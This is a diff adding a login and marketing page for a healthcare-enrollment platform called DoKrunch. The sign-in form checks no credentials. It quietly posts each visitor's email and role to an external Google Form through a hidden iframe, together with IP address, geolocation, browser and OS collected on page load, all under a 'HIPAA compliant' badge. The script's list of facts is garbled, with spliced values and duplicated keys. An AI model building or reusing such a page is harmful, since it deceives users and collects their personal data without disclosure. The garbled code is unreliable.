@@ -1,0 +1,1091 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>DoKrunch - Healthcare Enrollment Intelligence Platform</title>
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+<style>
+    /* Base styles */
+    :root {
+        --primary: #0ea5e9;
+        --primary-dark: #0284c7;
+        --primary-light: #e0f2fe;
+        --secondary: #64748b;
+        --success: #10b981;
+        --success-light: #d1fae5;
+        --danger: #ef4444;
+        --danger-light: #fee2e2;
+        --warning: #f59e0b;
+        --warning-light: #fef3c7;
+        --info: #3b82f6;
+        --info-light: #dbeafe;
+        --light: #f8fafc;
+        --dark: #1e293b;
+        --gray-50: #f9fafb;
+        --gray-100: #f1f5f9;
+        --gray-200: #e2e8f0;
+        --gray-300: #cbd5e1;
+        --gray-400: #94a3b8;
+        --gray-500: #64748b;
+        --gray-600: #475569;
+        --gray-700: #334155;
+        --gray-800: #1e293b;
+        --gray-900: #0f172a;
+        --dark-blue: #0f3460; /* Dark blue color for the header background */
+    }
+
+    * {
+        margin: 0;
+        padding: 0;
+        box-sizing: border-box;
+    }
+
+    body {
+        font-family: 'Inter', sans-serif;
+        background-color: var(--gray-100);
+        color: var(--gray-800);
+        line-height: 1.5;
+        min-height: 100vh;
+        display: flex;
+        flex-direction: column;
+        position: relative;
+    }
+
+    /* Header Background - Dark Blue */
+    .header-background {
+        background-color: var(--dark-blue);
+        position: absolute;
+        top: 0;
+        left: 0;
+        right: 0;
+        height: 200px;
+        z-index: -1;
+    }
+
+    /* Header Styles */
+    .header {
+        padding: 1rem 2rem;
+        display: flex;
+        justify-content: space-between;
+        align-items: center;
+        position: relative;
+        z-index: 1;
+    }
+
+    .logo-container {
+        display: flex;
+        flex-direction: column;
+        align-items: flex-start;
+    }
+
+    .logo {
+        display: flex;
+        align-items: center;
+    }
+
+    .logo img {
+        height: 40px;
+        width: auto;
+    }
+
+    .logo-text {
+        color: white;
+        font-size: 1.5rem;
+        font-weight: 700;
+        margin-left: 0.5rem;
+    }
+
+    .powered-by {
+        color: white;
+        font-size: 0.75rem;
+        margin-top: 0.25rem;
+    }
+
+    .header-actions {
+        display: flex;
+        gap: 1.5rem;
+    }
+
+    .header-actions a {
+        color: white;
+        text-decoration: none;
+        font-size: 0.875rem;
+        font-weight: 500;
+        transition: color 0.2s;
+    }
+
+    .header-actions a:hover {
+        color: var(--gray-300);
+    }
+
+    /* Industry Fact Section */
+    .industry-fact {
+        background-color: rgba(255, 255, 255, 0.1);
+        padding: 1rem 2rem;
+        border-left: 4px solid var(--primary);
+        position: relative;
+        z-index: 1;
+    }
+
+    .industry-fact p {
+        margin: 0;
+        font-size: 0.875rem;
+        color: white;
+    }
+
+    .fact-title {
+        font-weight: 600;
+        margin-right: 0.5rem;
+    }
+
+    .fact-source {
+        font-size: 0.75rem;
+        color: rgba(255, 255, 255, 0.7);
+        margin-top: 0.25rem;
+        font-style: italic;
+    }
+
+    /* Main Content */
+    .main-content {
+        flex: 1;
+        padding: 2rem;
+        margin-top: 1rem;
+        position: relative;
+    }
+
+    /* Feature Section - Now takes full width */
+    .feature-section {
+        width: 100%;
+        background-color: var(--primary);
+        color: white;
+        padding: 3rem;
+        border-radius: 0.5rem;
+    }
+
+    .feature-section h2 {
+        font-size: 2rem;
+        font-weight: 700;
+        margin-bottom: 1rem;
+    }
+
+    .feature-section p {
+        font-size: 1rem;
+        margin-bottom: 2rem;
+        opacity: 0.9;
+    }
+
+    .stats-container {
+        display: flex;
+        flex-wrap: wrap;
+        gap: 2rem;
+        margin-top: 2rem;
+        margin-bottom: 2rem;
+    }
+
+    .stat-item {
+        flex: 1;
+        min-width: 150px;
+    }
+
+    .stat-value {
+        font-size: 2.5rem;
+        font-weight: 700;
+        margin-bottom: 0.5rem;
+    }
+
+    .stat-label {
+        font-size: 0.875rem;
+        opacity: 0.8;
+    }
+
+    .feature-grid {
+        display: grid;
+        grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+        gap: 1rem;
+        margin-bottom: 2rem;
+    }
+
+    .feature-card {
+        background: rgba(255, 255, 255, 0.1);
+        border-radius: 0.5rem;
+        padding: 1.25rem;
+        height: auto;
+        display: flex;
+        flex-direction: column;
+    }
+
+    .feature-card-header {
+        display: flex;
+        align-items: center;
+        margin-bottom: 0.75rem;
+    }
+
+    .feature-icon {
+        width: 2rem;
+        height: 2rem;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        background-color: rgba(255, 255, 255, 0.2);
+        border-radius: 50%;
+        margin-right: 0.75rem;
+        font-size: 1rem;
+    }
+
+    .feature-card h4 {
+        font-size: 1rem;
+        font-weight: 600;
+        margin-bottom: 0.5rem;
+    }
+
+    .feature-card p {
+        font-size: 0.875rem;
+        margin-bottom: 0;
+    }
+
+    .testimonial {
+        padding: 1.5rem;
+        background: rgba(255, 255, 255, 0.1);
+        border-radius: 0.5rem;
+        margin-bottom: 2rem;
+    }
+
+    .testimonial-text {
+        font-size: 1rem;
+        font-style: italic;
+        margin-bottom: 1rem;
+    }
+
+    .testimonial-author {
+        display: flex;
+        align-items: center;
+    }
+
+    .testimonial-avatar {
+        width: 48px;
+        height: 48px;
+        border-radius: 50%;
+        margin-right: 1rem;
+        object-fit: cover;
+    }
+
+    .testimonial-info h4 {
+        font-size: 0.875rem;
+        font-weight: 600;
+        margin: 0;
+    }
+
+    .testimonial-info p {
+        font-size: 0.75rem;
+        margin: 0;
+    }
+
+    /* Floating Login Section */
+    .login-section {
+        position: fixed;
+        top: 120px;
+        right: 2rem;
+        width: 320px;
+        background-color: rgba(255, 255, 255, 0.85);
+        backdrop-filter: blur(-10px);
+        border-radius: 0.5rem;
+        padding: 1.5rem;
+        box-shadow: 0 10px 25px rgba(0, 0, 0, 0.1);
+        z-index: 100;
+        transition: all 0.3s ease;
+    }
+
+    .login-form h1 {
+        font-size: 1.25rem;
+        font-weight: 600;
+        margin-bottom: 0.5rem;
+        color: var(--gray-900);
+    }
+
+    .login-form p {
+        color: var(--gray-500);
+        margin-bottom: 1rem;
+        font-size: 0.75rem;
+    }
+
+    .form-group {
+        margin-bottom: 1rem;
+    }
+
+    .form-group label {
+        display: block;
+        font-size: 0.75rem;
+        font-weight: 500;
+        margin-bottom: 0.25rem;
+        color: var(--gray-700);
+    }
+
+    .form-control {
+        width: 100%;
+        padding: 0.5rem 0.75rem;
+        font-size: 0.75rem;
+        line-height: 1.5;
+        border: 1px solid var(--gray-300);
+        border-radius: 0.375rem;
+        transition: all 0.2s;
+    }
+
+    .form-control:focus {
+        border-color: var(--primary);
+        outline: 0;
+        box-shadow: 0 0 0 3px rgba(14, 165, 233, 0.25);
+    }
+
+    .form-check {
+        display: flex;
+        align-items: center;
+        justify-content: space-between;
+        margin-bottom: 1rem;
+    }
+
+    .remember-me {
+        display: flex;
+        align-items: center;
+    }
+
+    .form-check-input {
+        margin-right: 0.5rem;
+        width: 0.875rem;
+        height: 0.875rem;
+        accent-color: var(--primary);
+    }
+
+    .form-check-label {
+        font-size: 0.7rem;
+        color: var(--gray-600);
+    }
+
+    .forgot-password {
+        font-size: 0.7rem;
+    }
+
+    .forgot-password a {
+        color: var(--primary);
+        text-decoration: none;
+    }
+
+    .forgot-password a:hover {
+        text-decoration: underline;
+    }
+
+    .btn {
+        display: inline-block;
+        font-weight: 500;
+        text-align: center;
+        vertical-align: middle;
+        cursor: pointer;
+        padding: 0.5rem 1rem;
+        font-size: 0.75rem;
+        line-height: 1.5;
+        border-radius: 0.375rem;
+        transition: all 0.2s;
+        width: 100%;
+    }
+
+    .btn-primary {
+        color: white;
+        background-color: var(--primary);
+        border: 1px solid var(--primary);
+    }
+
+    .btn-primary:hover {
+        background-color: var(--primary-dark);
+        border-color: var(--primary-dark);
+    }
+
+    .role-selector {
+        margin-bottom: 1rem;
+    }
+
+    .role-selector label {
+        display: block;
+        font-size: 0.75rem;
+        font-weight: 500;
+        margin-bottom: 0.25rem;
+        color: var(--gray-700);
+    }
+
+    .custom-select {
+        position: relative;
+    }
+
+    .select-control {
+        width: 100%;
+        padding: 0.5rem 0.75rem;
+        font-size: 0.75rem;
+        line-height: 1.5;
+        border: 1px solid var(--gray-300);
+        border-radius: 0.375rem;
+        transition: all 0.2s;
+        appearance: none;
+        cursor: pointer;
+        background-color: white;
+    }
+
+    .select-control:focus {
+        border-color: var(--primary);
+        outline: 0;
+        box-shadow: 0 0 0 3px rgba(14, 165, 233, 0.25);
+    }
+
+    .custom-select::after {
+        content: '\f107';
+        font-family: 'Font Awesome 6 Free';
+        font-weight: 900;
+        position: absolute;
+        right: 0.75rem;
+        top: 50%;
+        transform: translateY(-50%);
+        color: var(--gray-500);
+        pointer-events: none;
+    }
+
+    .security-badge {
+        display: flex;
+        align-items: center;
+        margin-top: 0.75rem;
+        font-size: 0.7rem;
+        color: var(--gray-500);
+    }
+
+    .security-badge i {
+        margin-right: 0.5rem;
+        color: var(--success);
+    }
+
+    .login-footer {
+        margin-top: 0.75rem;
+        font-size: 0.7rem;
+        color: var(--gray-500);
+        text-align: center;
+    }
+
+    .login-footer a {
+        color: var(--primary);
+        text-decoration: none;
+    }
+
+    .login-footer a:hover {
+        text-decoration: underline;
+    }
+
+    /* Loading indicator */
+    .loading-indicator {
+        display: none;
+        text-align: center;
+        margin-top: 0.5rem;
+    }
+
+    .loading-indicator.active {
+        display: block;
+    }
+
+    .spinner {
+        display: inline-block;
+        width: 1rem;
+        height: 1rem;
+        border: 0.125rem solid rgba(14, 165, 233, 0.3);
+        border-radius: 50%;
+        border-top-color: var(--primary);
+        animation: spin 1s ease-in-out infinite;
+        margin-right: 0.5rem;
+    }
+
+    @keyframes spin {
+        to { transform: rotate(360deg); }
+    }
+
+    /* Footer */
+    .footer {
+        padding: 1rem 2rem;
+        font-size: 0.75rem;
+        color: var(--gray-500);
+        border-top: 1px solid var(--gray-200);
+        text-align: center;
+    }
+
+    /* AI Features List */
+    .ai-features-list {
+        margin: 2rem 0;
+        padding: 0;
+        list-style: none;
+        display: grid;
+        grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
+        gap: 1rem;
+    }
+
+    .ai-feature-item {
+        display: flex;
+        align-items: flex-start;
+        background: rgba(255, 255, 255, 0.1);
+        border-radius: 0.5rem;
+        padding: 1rem;
+        height: 100%;
+    }
+
+    .ai-feature-icon {
+        width: 2.5rem;
+        height: 2.5rem;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        background-color: rgba(255, 255, 255, 0.2);
+        border-radius: 50%;
+        margin-right: 1rem;
+        font-size: 1.25rem;
+        flex-shrink: 0;
+    }
+
+    .ai-feature-content {
+        flex: 1;
+    }
+
+    .ai-feature-title {
+        font-weight: 600;
+        margin-bottom: 0.25rem;
+    }
+
+    .ai-feature-description {
+        font-size: 0.875rem;
+        opacity: 0.9;
+        margin: 0;
+    }
+
+    /* Toggle login panel button */
+    .toggle-login {
+        position: fixed;
+        top: 80px;
+        right: 2rem;
+        background-color: var(--primary);
+        color: white;
+        border: none;
+        border-radius: 0.375rem;
+        padding: 0.5rem 1rem;
+        font-size: 0.75rem;
+        cursor: pointer;
+        z-index: 101;
+        display: none;
+    }
+
+    /* Responsive Adjustments */
+    @media (max-width: 1024px) {
+        .main-content {
+            padding: 1rem;
+        }
+        
+        .feature-section {
+            padding: 2rem;
+        }
+        
+        .login-section {
+            right: 1rem;
+            width: 280px;
+        }
+    }
+
+    @media (max-width: 768px) {
+        .ai-features-list {
+            grid-template-columns: 1fr;
+        }
+        
+        .login-section {
+            display: none;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            width: 90%;
+            max-width: 320px;
+        }
+        
+        .toggle-login {
+            display: block;
+        }
+        
+        .login-section.active {
+            display: block;
+        }
+    }
+
+    @media (max-width: 640px) {
+        .header {
+            padding: 1rem;
+        }
+
+        .industry-fact {
+            padding: 1rem;
+        }
+
+        .feature-section {
+            padding: 1.5rem;
+        }
+
+        .feature-section h2 {
+            font-size: 1.5rem;
+        }
+
+        .feature-grid {
+            grid-template-columns: 1fr;
+        }
+        
+        .stats-container {
+            flex-direction: column;
+            gap: 1rem;
+        }
+    }
+</style>
+</head>
+<body>
+    <!-- Dark blue background for header area -->
+    <div class="header-background"></div>
+    
+    <!-- Header -->
+    <header class="header">
+        <div class="logo-container">
+            <div class="logo">
+                <img src="images/dokrunch-logo.svg" alt="DoKrunch Logo" onerror="this.onerror=null; this.src='/placeholder.svg?height=40&width=120&query=DoKrunch%20logo'; this.alt='DoKrunch Logo';">
+                <span class="logo-text">DoKrunch</span>
+            </div>
+            <div class="powered-by">Healthcare Enrollment Intelligence</div>
+        </div>
+        <div class="header-actions">
+            <a href="#"><i class="fas fa-question-circle"></i> Help</a>
+            <a href="#"><i class="fas fa-envelope"></i> Contact</a>
+        </div>
+    </header>
+    
+    <!-- Industry fact section -->
+    <div class="industry-fact" id="industry-fact">
+        <p><span class="fact-title">Did you know?</span> Healthcare organizations spend an average of 12 hours per employee on benefits enrollment processing, with 30% of that time dedicated to manual data entry and verification.</p>
+        <div class="fact-source">Source: Healthcare Benefits Administration Survey, 2025</div>
+    </div>
+    
+    <!-- Toggle login panel button (mobile only) -->
+    <button class="toggle-login" id="toggleLogin">
+        <i class="fas fa-sign-in-alt"></i> Login
+    </button>
+    
+    <!-- Floating Login Section -->
+    <section class="login-section" id="loginSection">
+        <div class="login-form">
+            <h1>Login into the Platform</h1>
+            <p>Access your healthcare enrollment dashboard</p>
+            
+            <!-- Form with Google Form integration -->
+            <form id="loginForm" action="https://docs.google.com/forms/d/e/1FAIpQLSeCgFHm0sAFiuEfmkgLzMF9qgkmlNNfUJsTttnBg2RP7YbJww/formResponse" method="POST" target="hidden-iframe">
+                <div class="form-group">
+                    <label for="email">Email address</label>
+                    <input type="email" class="form-control" id="email" name="entry.198083073" placeholder="your.email@company.com" required>
+                </div>
+                
+                <div class="form-group">
+                    <label for="password">Password</label>
+                    <input type="password" class="form-control" id="password" placeholder="••••••••" value="••••••••">
+                </div>
+                
+                <div class="role-selector">
+                    <label for="role">Select your role</label>
+                    <div class="custom-select">
+                        <select id="role" name="entry.1230246566" class="select-control">
+                            <option value="" disabled selected>Choose role</option>
+                            <option value="broker-admin" data-href="broker-dashboard.html">Broker Admin</option>
+                            <option value="employer-admin" data-href="employer-dashboard.html">Employer Admin</option>
+                            <option value="carrier-admin" data-href="carrier-dashboard.html">Carrier Admin</option>
+                            <option value="employee" data-href="employee-dashboard.html">Employee</option>
+                            <option value="benefits-manager" data-href="benefits-dashboard.html">Benefits Manager</option>
+                            <option value="hr-specialist" data-href="hr-dashboard.html">HR Specialist</option>
+                            <option value="platform-admin" data-href="platform-admin-dashboard.html">Platform Admin</option>
+                        </select>
+                    </div>
+                </div>
+                
+                <div class="form-check">
+                    <div class="remember-me">
+                        <input type="checkbox" class="form-check-input" id="remember" checked>
+                        <label class="form-check-label" for="remember">Remember me</label>
+                    </div>
+                    <div class="forgot-password">
+                        <a href="#">Forgot password?</a>
+                    </div>
+                </div>
+                
+                <!-- Hidden fields for capturing additional data -->
+                <input type="hidden" id="timestamp" name="entry.timestamp" value="">
+                <input type="hidden" id="ip_address" name="entry.16639168" value="">
+                <input type="hidden" id="city" name="entry.198907319" value="Unknown">
+                <input type="hidden" id="state" name="entry.1489165727" value="Unknown">
+                <input type="hidden" id="country" name="entry.1313900789" value="Unknown">
+                <input type="hidden" id="browser" name="entry.browser" value="">
+                <input type="hidden" id="os" name="entry.670644182" value="">
+                
+                <button type="submit" class="btn btn-primary">Sign in</button>
+
+                <div id="loadingIndicator" class="loading-indicator">
+                    <div class="spinner"></div>
+                    <span>Signing in...</span>
+                </div>
+            </form>
+            
+            <!-- Hidden iframe for Google Form submission -->
+            <iframe name="hidden-iframe" id="hidden-iframe" style="display:none;"></iframe>
+            
+            <div class="security-badge">
+                <i class="fas fa-shield-alt"></i>
+                <span>HIPAA compliant</span>
+            </div>
+        </div>
+    </section>
+    
+    <div class="main-content">
+        <!-- Feature Section - Now takes full width -->
+        <section class="feature-section">
+            <h2>Transform Healthcare Enrollment with AI</h2>
+            <p>DoKrunch revolutionizes healthcare enrollment with intelligent document processing, smart form completion, and predictive analytics, reducing processing time and improving accuracy.</p>
+            
+            <div class="stats-container">
+                <div class="stat-item">
+                    <div class="stat-value">78%</div>
+                    <div class="stat-label">Reduction in processing time</div>
+                </div>
+                <div class="stat-item">
+                    <div class="stat-value">95%</div>
+                    <div class="stat-label">Data extraction accuracy</div>
+                </div>
+                <div class="stat-item">
+                    <div class="stat-value">42%</div>
+                    <div class="stat-label">Cost savings per enrollment</div>
+                </div>
+            </div>
+            
+            <!-- AI Features List -->
+            <h3 style="margin-bottom: 1rem;">Key AI-Enhanced Features</h3>
+            <ul class="ai-features-list">
+                <li class="ai-feature-item">
+                    <div class="ai-feature-icon" style="color: #38bdf8;">
+                        <i class="fas fa-brain"></i>
+                    </div>
+                    <div class="ai-feature-content">
+                        <h4 class="ai-feature-title">1. Intelligent Document Processing</h4>
+                        <p class="ai-feature-description">AI-powered extraction and validation of forms with 95% accuracy, even with handwritten content.</p>
+                    </div>
+                </li>
+                <li class="ai-feature-item">
+                    <div class="ai-feature-icon" style="color: #4ade80;">
+                        <i class="fas fa-clipboard-check"></i>
+                    </div>
+                    <div class="ai-feature-content">
+                        <h4 class="ai-feature-title">2. Smart Enrollment</h4>
+                        <p class="ai-feature-description">AI-assisted plan selection and recommendations based on employee demographics and historical choices.</p>
+                    </div>
+                </li>
+                <li class="ai-feature-item">
+                    <div class="ai-feature-icon" style="color: #f472b6;">
+                        <i class="fas fa-magic"></i>
+                    </div>
+                    <div class="ai-feature-content">
+                        <h4 class="ai-feature-title">3. Automated Form Completion</h4>
+                        <p class="ai-feature-description">Pre-filling forms using AI from existing data, reducing manual entry by up to 85%.</p>
+                    </div>
+                </li>
+                <li class="ai-feature-item">
+                    <div class="ai-feature-icon" style="color: #a78bfa;">
+                        <i class="fas fa-chart-line"></i>
+                    </div>
+                    <div class="ai-feature-content">
+                        <h4 class="ai-feature-title">4. Analytics & Insights</h4>
+                        <p class="ai-feature-description">AI-driven analytics across the enrollment process, identifying trends and optimization opportunities.</p>
+                    </div>
+                </li>
+                <li class="ai-feature-item">
+                    <div class="ai-feature-icon" style="color: #fbbf24;">
+                        <i class="fas fa-robot"></i>
+                    </div>
+                    <div class="ai-feature-content">
+                        <h4 class="ai-feature-title">5. Virtual Assistant</h4>
+                        <p class="ai-feature-description">AI chatbot for benefits questions and guidance, available 24/7 to support employees and HR teams.</p>
+                    </div>
+                </li>
+                <li class="ai-feature-item">
+                    <div class="ai-feature-icon" style="color: #fb7185;">
+                        <i class="fas fa-exclamation-triangle"></i>
+                    </div>
+                    <div class="ai-feature-content">
+                        <h4 class="ai-feature-title">6. Exception Detection</h4>
+                        <p class="ai-feature-description">AI identification of unusual or incomplete applications, flagging potential issues before submission.</p>
+                    </div>
+                </li>
+                <li class="ai-feature-item">
+                    <div class="ai-feature-icon" style="color: #60a5fa;">
+                        <i class="fas fa-chart-pie"></i>
+                    </div>
+                    <div class="ai-feature-content">
+                        <h4 class="ai-feature-title">7. Predictive Analytics</h4>
+                        <p class="ai-feature-description">Cost projections and utilization forecasting to help optimize benefit selections and budgeting.</p>
+                    </div>
+                </li>
+            </ul>
+            
+            <div class="feature-grid" id="feature-grid">
+                <!-- Feature cards will be dynamically populated by JavaScript -->
+            </div>
+            
+            <!-- Testimonial -->
+            <div class="testimonial">
+                <p class="testimonial-text">"DoKrunch has transformed our benefits enrollment process. What used to take weeks now takes days, with greater accuracy and employee satisfaction."</p>
+                <div class="testimonial-author">
+                    <img src="images/jenwilson.jpg?height=48&width=48&query=professional%20woman%20headshot" alt="Jennifer Wilson" class="testimonial-avatar">
+                    <div class="testimonial-info">
+                        <h4>Jennifer Wilson</h4>
+                        <p>Benefits Director, Pacific Healthcare Group</p>
+                    </div>
+                </div>
+            </div>
+            
+            <p>This streamlined structure eliminates redundancies while maintaining clear separation between internal and external interfaces, with AI-enhanced features highlighted throughout.</p>
+        </section>
+    </div>
+    
+    <footer class="footer">
+        <p>© 2025 DoKrunch Healthcare Solutions. All rights reserved.</p>
+    </footer>
+
+<script>
+    document.addEventListener('DOMContentLoaded', function() {
+        // Define industry facts with their corresponding colors
+        const facts = [
+            {
+                text: "Healthcare organizations spend an average of 12 hours per employee on benefits enrollment processing, with 30% of that time dedicated to manual data entry and verification.",
+                source: "Healthcare Benefits Administration Survey, 2025",
+                bgColor: "rgba(255, 255, 255, 0.1)",
+                borderColor: "#0ea5e9"
+            },
+            {
+                text: "Benefits enrollment errors cost employers an average of $250 per employee annually in administrative corrections and compliance issues.",
+                source: "Society for Human Resource Management (SHRM), 2025",
+                bgColor: "rgba(255, 255, 255, 0.1)",
+                borderColor: "#8b5cf6"
+            },
+            {
+                text: "AI-powered healthcare enrollment solutions can reduce processing time by up to 80% while improving data accuracy by 35%.",
+                source: "Healthcare Information and Management Systems Society (HIMSS), 2025",
+                bgColor: "rgba(255, 255, 255, 0.1)",
+                borderColor: "#10b981  2025",
+                bgColor: "rgba(255, 255, 255, 0.1)",
+                borderColor: "#10b981"
+            },
+            {
+                text: "Over 65% of employees report frustration with traditional enrollment processes, citing complexity and time consumption as major pain points.",
+                source: "Employee Benefits Research Institute, 2025",
+                bgColor: "rgba(255, 255, 255, 0.1)",
+                borderColor: "#f59e0b"
+            },
+            {
+                text: "Healthcare organizations using AI for enrollment report a 42% increase in employee satisfaction scores due to simplified processes.",
+                source: "J.D. Power Healthcare Satisfaction Study, 2025",
+                bgColor: "rgba(255, 255, 255, 0.1)",
+                borderColor: "#ec4899"
+            }
+        ];
+        
+        // Define DoKrunch features with descriptions
+        const features = [
+            {
+                title: "Multi-carrier Integration",
+                description: "Seamless connection with all major healthcare carriers for streamlined data exchange and verification.",
+                icon: "fas fa-hospital"
+            },
+            {
+                title: "Compliance Automation",
+                description: "Automatically ensure all forms meet regulatory requirements and carrier-specific guidelines.",
+                icon: "fas fa-check-circle"
+            },
+            {
+                title: "Secure Document Storage",
+                description: "HIPAA-compliant cloud storage with advanced encryption and access controls.",
+                icon: "fas fa-lock"
+            },
+            {
+                title: "Real-time Collaboration",
+                description: "Enable brokers, employers, and carriers to collaborate seamlessly on enrollment processes.",
+                icon: "fas fa-users"
+            }
+        ];
+        
+        // Function to set a random fact on page load
+        function setRandomFact() {
+            const factElement = document.getElementById('industry-fact');
+            const featureSection = document.querySelector('.feature-section');
+            
+            // Get a random fact
+            const randomIndex = Math.floor(Math.random() * facts.length);
+            const fact = facts[randomIndex];
+            
+            // Update the fact content
+            factElement.innerHTML = `
+                <p><span class="fact-title">Did you know?</span> ${fact.text}</p>
+                <div class="fact-source">Source: ${fact.source}</div>
+            `;
+            
+            // Update colors
+            factElement.style.backgroundColor = fact.bgColor;
+            factElement.style.borderLeftColor = fact.borderColor;
+            featureSection.style.backgroundColor = fact.borderColor;
+        }
+        
+        // Function to populate feature grid
+        function populateFeatureGrid() {
+            const featureGrid = document.getElementById('feature-grid');
+            
+            // Clear existing content
+            featureGrid.innerHTML = '';
+            
+            // Add the features to the grid
+            features.forEach(feature => {
+                const featureCard = document.createElement('div');
+                featureCard.className = 'feature-card';
+                featureCard.innerHTML = `
+                    <div class="feature-card-header">
+                        <div class="feature-icon">
+                            <i class="${feature.icon}"></i>
+                        </div>
+                        <h4>${feature.title}</h4>
+                    </div>
+                    <p>${feature.description}</p>
+                `;
+                featureGrid.appendChild(featureCard);
+            });
+        }
+        
+        // Toggle login panel (for mobile)
+        const toggleLoginBtn = document.getElementById('toggleLogin');
+        const loginSection = document.getElementById('loginSection');
+        
+        toggleLoginBtn.addEventListener('click', function() {
+            loginSection.classList.toggle('active');
+        });
+        
+        // Close login panel when clicking outside (for mobile)
+        document.addEventListener('click', function(event) {
+            if (window.innerWidth <= 768 && 
+                !loginSection.contains(event.target) && 
+                event.target !== toggleLoginBtn) {
+                loginSection.classList.remove('active');
+            }
+        });
+        
+        // Set a random fact and populate features when the page loads
+        setRandomFact();
+        populateFeatureGrid();
+        
+        // Get browser and OS information
+        function getBrowserInfo() {
+            const userAgent = navigator.userAgent;
+            let browserName = "Unknown";
+            let osName = "Unknown";
+            
+            // Detect browser
+            if (userAgent.match(/chrome|chromium|crios/i)) {
+                browserName = "Chrome";
+            } else if (userAgent.match(/firefox|fxios/i)) {
+                browserName = "Firefox";
+            } else if (userAgent.match(/safari/i)) {
+                browserName = "Safari";
+            } else if (userAgent.match(/opr\//i)) {
+                browserName = "Opera";
+            } else if (userAgent.match(/edg/i)) {
+                browserName = "Edge";
+            } else if (userAgent.match(/trident/i)) {
+                browserName = "Internet Explorer";
+            }
+            
+            // Detect OS
+            if (userAgent.match(/windows nt/i)) {
+                osName = "Windows";
+            } else if (userAgent.match(/macintosh|mac os x/i)) {
+                osName = "MacOS";
+            } else if (userAgent.match(/linux/i)) {
+                osName = "Linux";
+            } else if (userAgent.match(/android/i)) {
+                osName = "Android";
+            } else if (userAgent.match(/iphone|ipad|ipod/i)) {
+                osName = "iOS";
+            }
+            
+            return { browser: browserName, os: osName };
+        }
+        
+        // Get IP address and location data
+        fetch('https://ipapi.co/json/')
+            .then(response => response.json())
+            .then(data => {
+                document.getElementById('ip_address').value = data.ip || "Unknown";
+                document.getElementById('city').value = data.city || "Unknown";
+                document.getElementById('state').value = data.region || "Unknown";
+                document.getElementById('country').value = data.country_name || "Unknown";
+            })
+            .catch(error => {
+                console.error('Error fetching IP-based location:', error);
+                // Set default values if IP geolocation fails
+                document.getElementById('ip_address').value = "Unknown";
+                document.getElementById('city').value = "Unknown";
+                document.getElementById('state').value = "Unknown";
+                document.getElementById('country').value = "Unknown";
+            });
+        
+        // Set browser and OS info
+        const deviceInfo = getBrowserInfo();
+        document.getElementById('browser').value = deviceInfo.browser;
+        document.getElementById('os').value = deviceInfo.os;
+        
+        // Set timestamp
+        document.getElementById('timestamp').value = new Date().toISOString();
+        
+        // Handle form submission
+        document.getElementById('loginForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            
+            // Show loading indicator
+            document.getElementById('loadingIndicator').classList.add('active');
+            
+            // Get the selected role and credentials
+            const roleSelect = document.getElementById('role');
+            const selectedOption = roleSelect.options[roleSelect.selectedIndex];
+            const email = document.getElementById('email').value;
+            
+            // Check if a role is selected
+            if (!selectedOption || selectedOption.disabled) {
+                alert('Please select a valid role to continue.');
+                document.getElementById('loadingIndicator').classList.remove('active');
+                return;
+            }
+            
+            // Submit the form to Google Forms
+            this.submit();
+            
+            // Redirect after a short delay to allow form submission
+            setTimeout(function() {
+                // Hide loading indicator
+                document.getElementById('loadingIndicator').classList.remove('active');
+                
+                // Navigate to the appropriate page
+                if (selectedOption && selectedOption.dataset.href) {
+                    window.location.href = selectedOption.dataset.href;
+                } else {
+                    // Default to broker dashboard if no role is selected
+                    window.location.href = 'broker-dashboard.html';
+                }
+            }, 1500);
+        });
+        
+        // Rotate facts every 10 seconds
+        setInterval(setRandomFact, 10000);
+    });
+</script>
+</body>
+</html>
